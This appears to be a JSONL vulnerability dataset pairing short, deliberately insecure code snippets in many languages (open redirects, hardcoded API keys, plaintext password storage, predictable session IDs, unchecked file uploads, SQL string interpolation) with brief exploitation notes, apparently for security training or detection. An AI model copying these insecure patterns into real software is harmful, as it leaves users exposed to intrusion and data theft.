{"id": "vuln-504", "language": "Java", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "response.addCookie(new Cookie(\"csrf_token\", token));", "exploitation_techniques": "Forge CSRF tokens via cookie injection.", "cwe_category": "Session & Token Management"}
{"id": "vuln-505", "language": "PHP", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "setcookie('csrf_token', $token); if ($_POST['token'] == $_COOKIE['csrf_token']) { ... }", "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-506", "language": "Ruby", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "cookies[:csrf_token] = token; verify_authenticity_token", "exploitation_techniques": "Forge CSRF tokens via cookie manipulation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-507", "language": "Go", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"csrf_token\", Value: token});", "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-508", "language": "C# (.NET)", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "Response.Cookies.Append(\"csrf_token\", token);", "exploitation_techniques": "Forge CSRF tokens via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-509", "language": "Kotlin", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "call.response.cookies.append(\"csrf_token\", token)", "exploitation_techniques": "Manipulate CSRF cookie to bypass protection.", "cwe_category": "Session & Token Management"}
{"id": "vuln-510", "language": "Scala", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "Ok.withCookies(Cookie(\"csrf_token\", token))", "exploitation_techniques": "Forge CSRF tokens via cookie injection.", "cwe_category": "Session & Token Management"}
{"id": "vuln-511", "language": "Rust", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "res.cookie(Cookie::new(\"csrf_token\", token))", "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-512", "language": "Elixir", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "put_resp_cookie(conn, \"csrf_token\", token)", "exploitation_techniques": "Forge CSRF tokens via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-513", "language": "Perl", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "$r->headers_out->set('Set-Cookie' => \"csrf_token=$token\");", "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-515", "language": "Python", "vulnerability_type": "Open Redirect", "code_snippet": "return redirect(request.args.get('url'))", "exploitation_techniques": "Redirect to phishing site: ?url=http://evil.com", "cwe_category": "Access & Authorization"}
{"id": "vuln-516", "language": "Java", "vulnerability_type": "Open Redirect", "code_snippet": "response.sendRedirect(request.getParameter(\"url\"));", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-517", "language": "PHP", "vulnerability_type": "Open Redirect", "code_snippet": "header('Location: ' . $_GET['url']);", "exploitation_techniques": "Redirect to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-518", "language": "Ruby", "vulnerability_type": "Open Redirect", "code_snippet": "redirect_to params[:url]", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-519", "language": "Go", "vulnerability_type": "Open Redirect", "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"url\"), http.StatusFound)", "exploitation_techniques": "Redirect to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-520", "language": "C# (.NET)", "vulnerability_type": "Open Redirect", "code_snippet": "return Redirect(Request.Query[\"url\"]);", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-521", "language": "Kotlin", "vulnerability_type": "Open Redirect", "code_snippet": "call.respondRedirect(call.request.queryParameters[\"url\"]!!)", "exploitation_techniques": "Redirect to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-522", "language": "Scala", "vulnerability_type": "Open Redirect", "code_snippet": "Redirect(params(\"url\"))", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-523", "language": "Rust", "vulnerability_type": "Open Redirect", "code_snippet": "res.redirect(&req.query(\"url\")?)", "exploitation_techniques": "Redirect to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-524", "language": "Elixir", "vulnerability_type": "Open Redirect", "code_snippet": "redirect conn, external: params[\"url\"]", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-526", "language": "Node.js", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "const redirectUri = req.query.redirect_uri; res.redirect(redirectUri);", "exploitation_techniques": "Redirect to malicious OAuth handler.", "cwe_category": "Access & Authorization"}
{"id": "vuln-527", "language": "Python", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "return redirect(request.args.get('redirect_uri'))", "exploitation_techniques": "Steal OAuth tokens via malicious redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-528", "language": "Java", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "response.sendRedirect(request.getParameter(\"redirect_uri\"));", "exploitation_techniques": "Redirect OAuth flow to attacker-controlled site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-529", "language": "PHP", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "header('Location: ' . $_GET['redirect_uri']);", "exploitation_techniques": "Steal tokens via malicious redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-530", "language": "Ruby", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "redirect_to params[:redirect_uri]", "exploitation_techniques": "Redirect to malicious OAuth handler.", "cwe_category": "Access & Authorization"}
{"id": "vuln-531", "language": "Go", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"redirect_uri\"), http.StatusFound)", "exploitation_techniques": "Steal OAuth tokens via redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-532", "language": "C# (.NET)", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "return Redirect(Request.Query[\"redirect_uri\"]);", "exploitation_techniques": "Redirect to attacker-controlled site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-533", "language": "Kotlin", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "call.respondRedirect(call.request.queryParameters[\"redirect_uri\"]!!)", "exploitation_techniques": "Steal tokens via malicious redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-534", "language": "Scala", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "Redirect(params(\"redirect_uri\"))", "exploitation_techniques": "Redirect OAuth flow to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-535", "language": "Rust", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "res.redirect(&req.query(\"redirect_uri\")?)", "exploitation_techniques": "Steal tokens via redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-536", "language": "Elixir", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "redirect conn, external: params[\"redirect_uri\"]", "exploitation_techniques": "Redirect to malicious OAuth handler.", "cwe_category": "Access & Authorization"}
{"id": "vuln-537", "language": "Perl", "vulnerability_type": "Insecure OAuth Redirect", "code_snippet": "$r->headers_out->set('Location' => $r->param('redirect_uri'));", "exploitation_techniques": "Steal OAuth tokens via redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-538", "language": "Node.js", "vulnerability_type": "Clickjacking", "code_snippet": "app.get('/', (req, res) => res.send('Page'));", "exploitation_techniques": "Embed site in iframe to perform clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-539", "language": "Python", "vulnerability_type": "Clickjacking", "code_snippet": "@app.route('/') def index(): return 'Page'", "exploitation_techniques": "Iframe site for clickjacking attacks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-540", "language": "Java", "vulnerability_type": "Clickjacking", "code_snippet": "@GetMapping(\"/\") public String index() { return \"Page\"; }", "exploitation_techniques": "Embed in iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-541", "language": "PHP", "vulnerability_type": "Clickjacking", "code_snippet": "echo 'Page';", "exploitation_techniques": "Iframe site to perform clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-542", "language": "Ruby", "vulnerability_type": "Clickjacking", "code_snippet": "get '/' do 'Page' end", "exploitation_techniques": "Embed site in iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-543", "language": "Go", "vulnerability_type": "Clickjacking", "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"Page\") })", "exploitation_techniques": "Iframe site for clickjacking attacks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-544", "language": "C# (.NET)", "vulnerability_type": "Clickjacking", "code_snippet": "[HttpGet(\"/\")] public IActionResult Index() { return Ok(\"Page\"); }", "exploitation_techniques": "Embed in iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-545", "language": "Kotlin", "vulnerability_type": "Clickjacking", "code_snippet": "get(\"/\") { call.respondText(\"Page\") }", "exploitation_techniques": "Iframe site for clickjacking attacks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-546", "language": "Scala", "vulnerability_type": "Clickjacking", "code_snippet": "get(\"/\") { Ok(\"Page\") }", "exploitation_techniques": "Embed site in iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-547", "language": "Rust", "vulnerability_type": "Clickjacking", "code_snippet": "router.get(\"/\", |_, res| res.render_text(\"Page\"))", "exploitation_techniques": "Iframe site for clickjacking attacks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-548", "language": "Elixir", "vulnerability_type": "Clickjacking", "code_snippet": "get \"/\", PageController, :index # returns 'Page'", "exploitation_techniques": "Embed in iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-549", "language": "Perl", "vulnerability_type": "Clickjacking", "code_snippet": "$r->print('Page');", "exploitation_techniques": "Iframe site for clickjacking attacks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-550", "language": "Node.js", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if (req.headers['content-type'] === 'application/json') parseJson(req.body);", "exploitation_techniques": "Spoof Content-Type to bypass parsing checks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-551", "language": "Python", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if request.headers['Content-Type'] == 'application/json': json.loads(request.data)", "exploitation_techniques": "Spoof Content-Type to inject malicious data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-552", "language": "Java", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if (request.getContentType().equals(\"application/json\")) { parseJson(request.getInputStream()); }", "exploitation_techniques": "Spoof Content-Type to bypass validation.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-553", "language": "PHP", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if ($_SERVER['CONTENT_TYPE'] === 'application/json') { json_decode(file_get_contents('php://input')); }", "exploitation_techniques": "Spoof Content-Type to inject data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-554", "language": "Ruby", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if request.content_type == 'application/json' then JSON.parse(request.body.read) end", "exploitation_techniques": "Spoof Content-Type to bypass parsing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-555", "language": "Go", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if r.Header.Get(\"Content-Type\") == \"application/json\" { json.NewDecoder(r.Body).Decode(&data) }", "exploitation_techniques": "Spoof Content-Type to inject malicious data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-556", "language": "C# (.NET)", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if (Request.ContentType == \"application/json\") { JsonSerializer.Deserialize(Request.Body); }", "exploitation_techniques": "Spoof Content-Type to bypass checks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-557", "language": "Kotlin", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if (call.request.contentType().toString() == \"application/json\") { call.receive<String>() }", "exploitation_techniques": "Spoof Content-Type to inject data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-558", "language": "Scala", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if (request.contentType.contains(\"application/json\")) { parse(request.body.asJson) }", "exploitation_techniques": "Spoof Content-Type to bypass parsing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-559", "language": "Rust", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if req.headers().get(\"content-type\") == Some(&\"application/json\".into()) { serde_json::from_reader(req.body()?) }", "exploitation_techniques": "Spoof Content-Type to inject data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-560", "language": "Elixir", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if get_req_header(conn, \"content-type\") == [\"application/json\"] do Jason.decode!(conn.body_params) end", "exploitation_techniques": "Spoof Content-Type to bypass checks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-561", "language": "Perl", "vulnerability_type": "Insecure Content-Type Handling", "code_snippet": "if ($r->header('Content-Type') eq 'application/json') { decode_json($r->content); }", "exploitation_techniques": "Spoof Content-Type to inject data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-562", "language": "Node.js", "vulnerability_type": "Insecure File Upload", "code_snippet": "app.post('/upload', (req, res) => { req.files.file.mv('uploads/' + req.files.file.name); });", "exploitation_techniques": "Upload malicious files like .php scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-563", "language": "Python", "vulnerability_type": "Insecure File Upload", "code_snippet": "file = request.files['file']; file.save('uploads/' + file.filename)", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-564", "language": "Java", "vulnerability_type": "Insecure File Upload", "code_snippet": "@PostMapping(\"/upload\") public void upload(@RequestParam(\"file\") MultipartFile file) { file.transferTo(new File(\"uploads/\" + file.getOriginalFilename())); }", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-565", "language": "PHP", "vulnerability_type": "Insecure File Upload", "code_snippet": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);", "exploitation_techniques": "Upload executable scripts like .php.", "cwe_category": "Access & Authorization"}
{"id": "vuln-566", "language": "Ruby", "vulnerability_type": "Insecure File Upload", "code_snippet": "file = params[:file]; File.open(\"uploads/#{file.original_filename}\", 'wb') { |f| f.write(file.tempfile) }", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-567", "language": "Go", "vulnerability_type": "Insecure File Upload", "code_snippet": "file, header, _ := r.FormFile(\"file\"); os.WriteFile(\"uploads/\"+header.Filename, file, 0644)", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-568", "language": "C# (.NET)", "vulnerability_type": "Insecure File Upload", "code_snippet": "[HttpPost(\"upload\")] public async Task Upload(IFormFile file) { await File.WriteAllBytesAsync(\"uploads/\" + file.FileName, file.OpenReadStream()); }", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-569", "language": "Kotlin", "vulnerability_type": "Insecure File Upload", "code_snippet": "val file = call.receiveMultipart().readPart() as FilePart; File(\"uploads/${file.fileName}\").writeBytes(file.streamProvider().readAllBytes())", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-570", "language": "Scala", "vulnerability_type": "Insecure File Upload", "code_snippet": "val file = request.body.asMultipartFormData.get.file(\"file\"); Files.write(Paths.get(\"uploads\", file.filename), file.ref)", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-571", "language": "Rust", "vulnerability_type": "Insecure File Upload", "code_snippet": "let file = req.multipart()?.next_field()?.unwrap(); fs::write(format!(\"uploads/{}\", file.name()?), file.bytes()?)?;", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-572", "language": "Elixir", "vulnerability_type": "Insecure File Upload", "code_snippet": "file = params[\"file\"]; File.write(\"uploads/#{file.filename}\", file.tempfile)", "exploitation_techniques": "Upload malicious files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-573", "language": "Perl", "vulnerability_type": "Insecure File Upload", "code_snippet": "my $file = $r->upload('file'); open(my $fh, '>', \"uploads/$file->filename\");", "exploitation_techniques": "Upload executable scripts.", "cwe_category": "Access & Authorization"}
{"id": "vuln-574", "language": "Node.js", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "const sessionId = Date.now() + '-' + Math.random();", "exploitation_techniques": "Predict session IDs to hijack sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-576", "language": "Java", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "String sessionId = System.currentTimeMillis() + \"-\" + new Random().nextInt(1000);", "exploitation_techniques": "Predict IDs to hijack sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-577", "language": "PHP", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "$session_id = time() . rand(1000, 9999);", "exploitation_techniques": "Guess session IDs based on time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-578", "language": "Ruby", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "session[:id] = Time.now.to_i.to_s + rand(1000).to_s", "exploitation_techniques": "Predict IDs to hijack sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-579", "language": "Go", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "sessionId := fmt.Sprintf(\"%d-%d\", time.Now().Unix(), rand.Intn(1000))", "exploitation_techniques": "Guess session IDs based on timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-580", "language": "C# (.NET)", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "var sessionId = DateTime.Now.Ticks + \"-\" + new Random().Next(1000);", "exploitation_techniques": "Predict IDs to hijack sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-581", "language": "Kotlin", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "val sessionId = \"${System.currentTimeMillis()}-${Random().nextInt(1000)}\"", "exploitation_techniques": "Guess session IDs based on time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-582", "language": "Scala", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "val sessionId = s\"${System.currentTimeMillis()}-${scala.util.Random.nextInt(1000)}\"", "exploitation_techniques": "Predict IDs to hijack sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-583", "language": "Rust", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "let session_id = format!(\"{}-{}\", SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(), thread_rng().gen::<u32>());", "exploitation_techniques": "Guess session IDs based on timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-584", "language": "Elixir", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "session_id = \"#{:os.system_time(:second)}#{:rand.uniform(1000)}\"", "exploitation_techniques": "Predict IDs to hijack sessions.", "cwe_category": "Session & Token Management"}
{"id": "vuln-585", "language": "Perl", "vulnerability_type": "Insecure Session ID Generation", "code_snippet": "my $session_id = time() . rand(1000);", "exploitation_techniques": "Guess session IDs based on time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-586", "language": "Node.js", "vulnerability_type": "Insecure Cache Control", "code_snippet": "app.get('/user', (req, res) => res.json(userData));", "exploitation_techniques": "Access sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-587", "language": "Python", "vulnerability_type": "Insecure Cache Control", "code_snippet": "@app.route('/user') def user(): return jsonify(user_data)", "exploitation_techniques": "Retrieve sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-588", "language": "Java", "vulnerability_type": "Insecure Cache Control", "code_snippet": "@GetMapping(\"/user\") public User getUser() { return user; }", "exploitation_techniques": "Access cached sensitive data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-589", "language": "PHP", "vulnerability_type": "Insecure Cache Control", "code_snippet": "echo json_encode($user_data);", "exploitation_techniques": "Retrieve sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-590", "language": "Ruby", "vulnerability_type": "Insecure Cache Control", "code_snippet": "get '/user' do user.to_json end", "exploitation_techniques": "Access sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-591", "language": "Go", "vulnerability_type": "Insecure Cache Control", "code_snippet": "http.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(user) })", "exploitation_techniques": "Retrieve cached sensitive data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-592", "language": "C# (.NET)", "vulnerability_type": "Insecure Cache Control", "code_snippet": "[HttpGet(\"user\")] public IActionResult GetUser() { return Ok(user); }", "exploitation_techniques": "Access sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-593", "language": "Kotlin", "vulnerability_type": "Insecure Cache Control", "code_snippet": "get(\"/user\") { call.respond(user) }", "exploitation_techniques": "Retrieve cached sensitive data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-594", "language": "Scala", "vulnerability_type": "Insecure Cache Control", "code_snippet": "get(\"/user\") { Ok(user) }", "exploitation_techniques": "Access sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-595", "language": "Rust", "vulnerability_type": "Insecure Cache Control", "code_snippet": "router.get(\"/user\", |_, res| res.render_json(user))", "exploitation_techniques": "Retrieve cached sensitive data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-596", "language": "Elixir", "vulnerability_type": "Insecure Cache Control", "code_snippet": "get \"/user\", UserController, :show", "exploitation_techniques": "Access sensitive data from cache.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-597", "language": "Perl", "vulnerability_type": "Insecure Cache Control", "code_snippet": "$r->print(encode_json($user));", "exploitation_techniques": "Retrieve cached sensitive data.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-598", "language": "Node.js", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "const apiKey = '1234567890abcdef'; axios.get('https://api.com', { headers: { 'Authorization': apiKey } });", "exploitation_techniques": "Extract keys from source code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-599", "language": "Python", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "API_KEY = '1234567890abcdef'; requests.get('https://api.com', headers={'Authorization': API_KEY})", "exploitation_techniques": "Steal keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-600", "language": "Java", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "String apiKey = \"1234567890abcdef\"; HttpClient.get(\"https://api.com\", headers(\"Authorization\", apiKey));", "exploitation_techniques": "Extract keys from code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-601", "language": "PHP", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "$apiKey = '1234567890abcdef'; $ch = curl_init('https://api.com'); curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $apiKey]);", "exploitation_techniques": "Extract keys from source code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-602", "language": "Ruby", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "API_KEY = '1234567890abcdef'; HTTParty.get('https://api.com', headers: { 'Authorization' => API_KEY })", "exploitation_techniques": "Steal keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-603", "language": "Go", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "apiKey := \"1234567890abcdef\"; req, _ := http.NewRequest(\"GET\", \"https://api.com\", nil); req.Header.Add(\"Authorization\", apiKey)", "exploitation_techniques": "Extract keys from code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-604", "language": "C# (.NET)", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "string apiKey = \"1234567890abcdef\"; var client = new HttpClient(); client.DefaultRequestHeaders.Add(\"Authorization\", apiKey);", "exploitation_techniques": "Steal keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-605", "language": "Kotlin", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "val apiKey = \"1234567890abcdef\"; val client = HttpClient().get(\"https://api.com\") { header(\"Authorization\", apiKey) }", "exploitation_techniques": "Extract keys from code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-606", "language": "Scala", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "val apiKey = \"1234567890abcdef\"; WS.url(\"https://api.com\").withHeaders(\"Authorization\" -> apiKey).get()", "exploitation_techniques": "Steal keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-607", "language": "Rust", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "let api_key = \"1234567890abcdef\"; let client = reqwest::Client::new().get(\"https://api.com\").header(\"Authorization\", api_key);", "exploitation_techniques": "Extract keys from code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-608", "language": "Elixir", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "api_key = \"1234567890abcdef\"; HTTPoison.get!(\"https://api.com\", [{\"Authorization\", api_key}])", "exploitation_techniques": "Steal keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-609", "language": "Perl", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "my $api_key = '1234567890abcdef'; my $ua = LWP::UserAgent->new; $ua->get('https://api.com', Authorization => $api_key);", "exploitation_techniques": "Extract keys from code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-610", "language": "Node.js", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = req.body.password; db.save(user);", "exploitation_techniques": "Steal passwords from database breaches.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-611", "language": "Python", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user['password'] = request.form['password']; db.insert(user)", "exploitation_techniques": "Access plain text passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-612", "language": "Java", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.setPassword(request.getParameter(\"password\")); userRepository.save(user);", "exploitation_techniques": "Extract plain passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-613", "language": "PHP", "vulnerability_type": "Insecure Password Storage", "code_snippet": "$user['password'] = $_POST['password']; $db->insert($user);", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-614", "language": "Ruby", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = params[:password]; user.save", "exploitation_techniques": "Access plain passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-615", "language": "Go", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.Password = r.FormValue(\"password\"); db.Save(&user)", "exploitation_techniques": "Steal passwords from database breaches.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-616", "language": "C# (.NET)", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.Password = model.Password; await db.SaveAsync(user);", "exploitation_techniques": "Extract plain passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-617", "language": "Kotlin", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = call.request.queryParameters[\"password\"]; userRepo.save(user)", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-618", "language": "Scala", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = params(\"password\"); userRepo.save(user)", "exploitation_techniques": "Access plain passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-619", "language": "Rust", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = req.form::<User>().await?.password; db.save(user).await;", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-620", "language": "Elixir", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user = %{password: params[\"password\"]}; Repo.insert(user)", "exploitation_techniques": "Extract plain passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-621", "language": "Perl", "vulnerability_type": "Insecure Password Storage", "code_snippet": "$user->{password} = $r->param('password'); $db->insert($user);", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-622", "language": "Node.js", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "app.get('/user/:id', (req, res) => db.findById(req.params.id));", "exploitation_techniques": "Access unauthorized records by guessing IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-623", "language": "Python", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "@app.route('/user/<id>') def get_user(id): return db.get(id)", "exploitation_techniques": "Access records by iterating IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-624", "language": "Java", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "@GetMapping(\"/user/{id}\") public User getUser(@PathVariable Long id) { return userRepo.findById(id); }", "exploitation_techniques": "Access unauthorized data by guessing IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-625", "language": "PHP", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "$id = $_GET['id']; $user = $db->query(\"SELECT * FROM users WHERE id = $id\");", "exploitation_techniques": "Access records by manipulating IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-626", "language": "Ruby", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "get '/user/:id' do User.find(params[:id]).to_json end", "exploitation_techniques": "Access unauthorized records via ID guessing.", "cwe_category": "Access & Authorization"}
